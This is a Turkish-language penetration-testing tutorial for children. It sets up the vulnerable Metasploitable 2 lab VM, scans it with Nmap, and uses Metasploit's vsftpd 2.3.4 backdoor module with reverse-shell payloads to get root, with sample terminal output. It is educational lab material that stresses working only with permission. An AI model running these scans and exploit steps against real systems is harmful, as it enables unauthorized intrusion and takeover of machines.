# Sızma Testlerine Giriş: Çocuklar İçin Siber Güvenlik Macerası

Merhaba genç siber güvenlik kahramanları! Bu derste, bilgisayar ağlarının güvenliğini test etmek için kullanılan "sızma testi" (penetration testing) dünyasına adım atacağız. Sanki bir hazine avına çıkıyormuşuz gibi düşünebilirsiniz: Amacımız, bilgisayar sistemlerinde gizli zayıf noktaları bulmak ve onları korumak için çözüm üretmek! Kali Linux üzerinde terminal komutlarını kullanarak, sanal bir makineyi (Metasploitable) kuracak, Nmap ile ağları tarayacak ve sızma testi araçlarını keşfedeceğiz. Hazırsanız, başlayalım!

## 1. Sızma Testi Nedir?
Sızma testi, bir bilgisayar sisteminin veya ağın güvenliğini kontrol etmek için yapılan bir simülasyondur. Bu, bir dedektif gibi çalışmaya benzer: Sistemin zayıf noktalarını bulup, kötü niyetli kişilerden önce onları kapatmaya çalışırız. Sızma testi yaparken **etik** olmalıyız, yani sadece izin verilen sistemlerde çalışmalıyız.

**Örnek:** Bir kale düşünün. Kalenin kapıları ve pencereleri kilitli mi? Zayıf noktaları var mı? Sızma testi, bu zayıf noktaları bulup kaleyi güçlendirmek için yapılır.

**Adımlar:**
1. **Bilgi Toplama:** Hedef sistem hakkında bilgi toplarız (ör. IP adresleri).
2. **Tarama:** Sistemdeki açık kapıları (portları) ve hizmetleri buluruz.
3. **Zafiyet Analizi:** Zayıf noktaları tespit ederiz.
4. **Sömürü (Exploit):** Zayıf noktaları kullanarak sisteme girmeye çalışırız.
5. **Raporlama:** Bulgularımızı yazıp çözüm önerileri sunarız.

**Not:** Bu işlemleri sadece kendi bilgisayarınızda veya izinli test ortamlarında yapmalısınız. Yasal olmayan testler suçtur!

## 2. Metasploitable’ı VMware Sanal Makinesine Yükleme
Metasploitable, sızma testi öğrenmek için tasarlanmış, kasıtlı olarak zayıf bırakılmış bir sanal makinedir. Bunu bir "hedef tahtası" gibi düşünebilirsiniz: Güvenli bir şekilde hackleme pratiği yapmamızı sağlar.

### Adım Adım Kurulum
1. **Metasploitable’ı İndir:**
   - Metasploitable 2’yi şu adresten indirin: [SourceForge Metasploitable2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/)[](https://sibermetin.com/metasploitable-makine-coezuemue)
   - Dosya `.zip` formatında gelir. Zipten çıkarın.

2. **VMware ile Açma:**
   - VMware Workstation veya VMware Player’ı bilgisayarınıza kurun.
   - VMware’de “Open a Virtual Machine” seçeneğine tıklayın ve indirilen Metasploitable `.vmx` dosyasını seçin.
   - Ağ ayarlarını **NAT** veya **Host-Only** olarak ayarlayın (güvenlik için).[](https://yenicagbilisim.com/blog/metasploitable-2-giris-kurulum-kesif/)
   - Sanal makineyi başlatın.

3. **Giriş Yapma:**
   - Kullanıcı adı: `msfadmin`
   - Şifre: `msfadmin`[](https://www.ceyhuncamli.com.tr/metasploitable-2-walkthrough/)
   - IP adresini öğrenmek için terminalde:
     ```bash
     ifconfig
     ```
     **Örnek Çıktı:**
     ```yaml
     eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
           inet 10.0.2.4  netmask 255.255.255.0  broadcast 10.0.2.255
           ...
     ```
     Bu, makinenin IP adresinin `10.0.2.4` olduğunu gösterir.

**Eğlenceli Bilgi:** Metasploitable, bir hazine sandığı gibi zayıf noktalarla dolu! Ama sadece eğitim için kullanmalıyız.

## 3. Nmap Nedir ve Nasıl Kullanılır?
Nmap (Network Mapper), ağdaki cihazları ve açık portları taramak için kullanılan bir araçtır. Bir dedektifin büyüteci gibi: Ağdaki her kapıyı kontrol eder ve hangi kapıların açık olduğunu söyler.

### Nmap Kurulumu
Kali Linux’ta Nmap zaten yüklü gelir. Yüklü olup olmadığını kontrol etmek için:
```bash
nmap --version
```

### Temel Nmap Komutları
- **Basit Tarama:** Belirli bir IP adresini tarar.
  ```bash
  nmap 10.0.2.4
  ```
- **Tüm Portları Tarama:** 1-65535 arasındaki tüm portları kontrol eder.
  ```bash
  nmap -p- 10.0.2.4
  ```
- **Servis ve Versiyon Tespiti:** Açık portlardaki servislerin türünü ve versiyonunu bulur.
  ```bash
  nmap -sV 10.0.2.4
  ```
- **İşletim Sistemi Tespiti:** Hedef sistemin işletim sistemini tahmin eder.
  ```bash
  nmap -O 10.0.2.4
  ```
- **Agresif Tarama:** Daha detaylı bilgi toplar (port, servis, işletim sistemi).
  ```bash
  nmap -A 10.0.2.4
  ```

**Örnek Terminal Çıktısı (Basit Tarama):**
```scss
┌──(kali㉿kali)-[~]
└─$ nmap 10.0.2.4
Starting Nmap 7.94 ( https://nmap.org ) at 2025-08-01 15:30 +03
Nmap scan report for 10.0.2.4
Host is up (0.00084s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
3306/tcp open  mysql
...
Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
```

**Açıklama:** Bu çıktı, Metasploitable makinesinde FTP (21), SSH (22), Telnet (23), HTTP (80) ve MySQL (3306) gibi açık portları gösterir. Her port, bir kapı gibidir ve hangi hizmetlerin çalıştığını söyler.

## 4. Nmap ile Tarama Yapma
Nmap ile tarama, ağdaki cihazları ve zayıf noktaları bulmak için yapılır. Farklı tarama türleri vardır:
- **SYN Tarama (-sS):** Gizli bir tarama türüdür, bağlantıyı tamamlamaz.
  ```bash
  nmap -sS 10.0.2.4
  ```
- **UDP Tarama (-sU):** UDP protokolü kullanan portları tarar.
  ```bash
  nmap -sU 10.0.2.4
  ```
- **Zafiyet Taraması:** NSE (Nmap Script Engine) ile zafiyetleri tespit eder.
  ```bash
  nmap --script vuln 10.0.2.4
  ```

**Eğlenceli Analoji:** Nmap, bir kütüphanede hangi kitapların raflarda olduğunu kontrol eden bir kütüphaneci gibidir. Her port, bir raf; her servis, bir kitap!

## 5. Nmap Sonuçları ve Açıklamalar
Nmap tarama sonuçları, ağdaki cihazların durumunu ve zayıf noktalarını gösterir. Aşağıdaki örnek, Metasploitable üzerinde yapılan bir agresif taramanın sonucudur:

**Komut:**
```bash
nmap -A 10.0.2.4
```

**Örnek Çıktı:**
```scss
┌──(kali㉿kali)-[~]
└─$ nmap -A 10.0.2.4
Starting Nmap 7.94 ( https://nmap.org ) at 2025-08-01 15:35 +03
Nmap scan report for 10.0.2.4
Host is up (0.00051s latency).
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 2.3.4
22/tcp   open  ssh        OpenSSH 4.7p1 Debian-8ubuntu1.2
23/tcp   open  telnet     Linux telnetd
80/tcp   open  http       Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10)
3306/tcp open  mysql      MySQL 5.0.51a-3ubuntu5
...
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds
```

**Açıklama:**
- **Portlar ve Servisler:** 21 (FTP), 22 (SSH), 23 (Telnet), 80 (HTTP), 3306 (MySQL) açık. Her biri, sistemdeki bir "kapı" ve bu kapılarda çalışan servislerin versiyonları görülüyor (ör. vsftpd 2.3.4).
- **Zafiyetler:** Eski versiyonlar (ör. vsftpd 2.3.4) bilinen güvenlik açıklarına sahip olabilir. Bu, bir hazine avında zayıf bir kilit bulmaya benzer!
- **OS Tespiti:** Sistem, eski bir Linux sürümü (2.6.9 - 2.6.33) kullanıyor, bu da zafiyet olasılığını artırır.

## 6. Sanal Makineyi Hacklemek: Metasploit ile Exploit Kullanımı
Metasploit, sızma testleri için kullanılan güçlü bir araçtır. Bir süper kahraman aleti gibi: Zayıf noktaları bulur ve onları test eder. Metasploitable’ı hacklemek için aşağıdaki adımları izleyelim.

### Adım Adım Exploit Süreci
1. **Metasploit’i Başlat:**
   ```bash
   msfconsole
   ```
   Bu, Metasploit’in komut arayüzünü açar.[](https://www.beyaz.net/tr/guvenlik/makaleler/sizma_testlerinde_metasploit_kullanimi.html)

2. **Hedef Zafiyeti Seç:**
   Nmap taramasında vsftpd 2.3.4’ün açık olduğunu gördük. Bu versiyonun bilinen bir açığı var. Exploit’i seçmek için:
   ```bash
   use exploit/unix/ftp/vsftpd_234_backdoor
   ```

3. **Parametreleri Ayarla (Set Komutu):**
   - Hedef IP adresini belirt:
     ```bash
     set RHOSTS 10.0.2.4
     ```
   - Bağlantı portunu belirt (varsayılan 21):
     ```bash
     set RPORT 21
     ```

4. **Payload Seçimi:**
   Payload, exploit başarılı olduğunda ne yapılacağını belirler (ör. bir komut istemi aç). Varsayılan payload genellikle uygundur, ama kontrol etmek için:
   ```bash
   show payloads
   ```
   Örnek bir payload seçimi:
   ```bash
   set PAYLOAD cmd/unix/reverse
   ```

5. **Saldırıyı Başlat (Run veya Exploit):**
   ```bash
   run
   ```
   veya
   ```bash
   exploit
   ```

6. **Başarılı Olursa:** Bir oturum (session) açılır ve hedef sistemde komut çalıştırabilirsiniz. Örnek:
   ```bash
   whoami
   ```
   **Çıktı:** `root` (Metasploitable’da tam yetki alırsınız).

### “Exploit Completed but No Session Was Created” Hatası
Bu hata, exploit’in çalıştığı ama oturum açılamadığı anlamına gelir. Nedenleri ve çözümleri:
- **Yanlış IP veya Port:** `RHOSTS` ve `RPORT` doğru mu? Kontrol edin:
  ```bash
  show options
  ```
- **Payload Uyumsuzluğu:** Hedef sistemle uyumlu bir payload seçin. Örnek:
  ```bash
  set PAYLOAD generic/shell_reverse_tcp
  ```
- **Ağ Sorunları:** Her iki makinenin (Kali ve Metasploitable) aynı ağda olduğundan emin olun. NAT ağı kullanılıyorsa, VMware ayarlarında “NAT Network” seçili olmalı.[](https://sibermetin.com/metasploitable-makine-coezuemue)
- **Zafiyet Kapalı Olabilir:** Nmap ile portun hala açık olduğunu doğrulayın.

**Örnek Terminal Çıktısı (Başarılı Exploit):**
```scss
┌──(kali㉿kali)-[~]
└─$ msfconsole
[*] Starting the Metasploit Framework console...
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.0.2.4
RHOSTS => 10.0.2.4
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21
RPORT => 21
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] Command shell session 1 opened (192.168.1.26:46385 -> 10.0.2.4:6200)
whoami
root
```

## 7. Exploit -j ve Exploit -j -z Komutları
Metasploit’te `exploit -j` ve `exploit -j -z` komutları, exploit işlemlerini arka planda çalıştırmak için kullanılır:
- **exploit -j:** Exploit’i arka planda çalıştırır (job). Oturum açılırsa, `sessions` komutuyla erişebilirsiniz:
  ```bash
  sessions -i 1
  ```
- **exploit -j -z:** Exploit’i arka planda çalıştırır ve oturum açıldığında otomatik olarak bağlanmaz. Sessiz modda çalışır, manuel kontrol gerekir.

**Örnek Kullanım:**
```bash
exploit -j
```
**Çıktı:**
```scss
[*] Exploit running as background job 0.
```
Sonra:
```bash
sessions
```
**Çıktı:**
```scss
Active sessions
==============
  Id  Type                   Information
  --  ----                   -----------
  1   shell unix             vsftpd_234_backdoor
```

**Eğlenceli Analoji:** `exploit -j`, bir robotu görev yapmaya gönderip sonradan kontrol etmek gibidir. `exploit -j -z` ise robotun sessizce çalışmasını ve seni rahatsız etmemesini sağlar!

## 8. Çocuklar İçin Ek İpuçları
- **Güvenli Ortam:** Sadece Metasploitable gibi test sistemlerinde çalışın. Gerçek ağlara izinsiz girmek yasa dışıdır![](https://www.kalilinuxlogs.com/2025/07/metasploit-framework-exploit-gelistirme.html)
- **Öğrenmeye Devam Edin:** Nmap ve Metasploit’in daha fazla komutunu keşfedin. Örneğin, Nmap’in scriptlerini deneyin:
  ```bash
  nmap --script http-enum 10.0.2.4
  ```
- **Etik Olun:** Siber güvenlik, bir süper kahraman gibi dünyayı korumakla ilgilidir. Bilgilerinizi iyi amaçlar için kullanın.

## 9. Örnek Terminal Macerası
Hadi, tüm öğrendiklerinizi birleştirip bir macera yaşayalım:
1. Yeni bir klasör oluşturun:
   ```bash
   mkdir SiberMacera
   cd SiberMacera
   ```
2. Bir Python dosyası oluşturun:
   ```bash
   nano zaafiyet_taramasi.py
   ```
   İçeriği:
   ```python
   print("Siber güvenlik kahramanları, ağları tarıyor!")
   ```
   Kaydet: `CTRL + O`, `Enter`, `CTRL + X`
3. Çalıştır:
   ```bash
   python3 zaafiyet_taramasi.py
   ```
   **Çıktı:**
   ```scss
   Siber güvenlik kahramanları, ağları tarıyor!
   ```
4. IP adresinizi kaydedin:
   ```bash
   ifconfig > /home/kali/Documents/ip_bilgisi.txt
   cat /home/kali/Documents/ip_bilgisi.txt
   ```
5. Google’a ping atın:
   ```bash
   ping -c 3 google.com
   ```

**Tebrikler!** Artık bir siber güvenlik dedektifisiniz. Metasploitable’ı taradınız, zafiyetleri buldunuz ve güvenli bir şekilde sistemi test ettiniz.